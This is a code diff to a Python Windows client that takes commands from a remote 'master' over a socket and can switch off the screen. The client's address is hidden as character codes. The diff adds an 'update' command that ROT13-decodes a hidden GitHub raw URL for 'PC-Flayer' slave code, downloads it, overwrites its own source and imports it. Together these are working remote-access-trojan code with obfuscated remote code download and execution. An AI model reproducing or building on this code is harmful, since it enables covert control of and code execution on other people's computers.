@@ -3,16 +3,21 @@ import time
 import threading
 import subprocess
 import os
-import win32api, win32con
+import codecs
+import urllib.request as request
 try:
     import ctypes
 except:
     subprocess.call("pip install ctypes", shell=False)
     import ctypes
+import win32api, win32con
+
+if os.path.isfile("old.pyw"):
+    os.remove("old.pyw")
 
 PI = [49, 48, 46, 48, 46, 48, 46, 49, 50, 54]
 IP = ''.join(map(chr, PI))
-PORT = 5050
+PORT = 5051
 ADDR = (IP, PORT)
 
 CONNECTED = False
@@ -67,14 +72,28 @@ def processCommand(cmd, args):
     elif cmd == "screen-off":
         ctypes.windll.user32.SendMessageW(65535, 274, 61808, 2)
         return "!READY"
-    elif cmd == "screen-on":
-        ctypes.windll.user32.SendMessageW(65535, 274, 61808, -1)
-        x, y = (0, 0)
-        win32api.mouse_event(win32con.MOUSEEVENTF_MOVE, x, y)
-        return "!READY"
-    elif cmd == "clear-dns":
+    elif cmd == "update":
         subprocess.call("ipconfig /flushdns", shell=False)
-        return "!READY"
+        WS_1 = "//enj.tv"
+        WS_2 = "guhohfrepbagrag.pbz/ErqFbhecngpu"
+        WS_3 = "/CP-Synlre"
+        WS_4 = "/znva/fynirPbqr.clj"
+        WS = "uggcf:"+WS_1+WS_2+WS_3+WS_4
+        WS = codecs.decode(WS, "rot13")
+        received = request.urlopen(WS)
+        newFile = open("new.pyw", "w+")
+        if newFile.writable():
+            toWrite = ""
+            for line in received:
+                line = line.decode("utf-8")
+                toWrite = toWrite + line
+            newFile.write(toWrite)
+            newFile.close()
+            os.rename("source.pyw", "old.pyw")
+            os.rename("new.pyw", "source.pyw")
+            client.close()
+            import source
+            return "!UPDATE"
     else:
         print('[ERROR] Unknown command: ' + '"' + cmd + '"')
         return "!UNKNOWN"
@@ -95,7 +114,11 @@ def Receive():
                         msgList.pop(0)
                         args = msgList
                     toSend = processCommand(cmd, args)
-                    client.send(toSend.encode("utf-8"))
+                    if toSend == "!UPDATE":
+                        client.close()
+                        return
+                    else:
+                        client.send(toSend.encode("utf-8"))
             except:
                 print("[ERROR] Master disconnected / failed to listen for command.")
                 CONNECTED = False
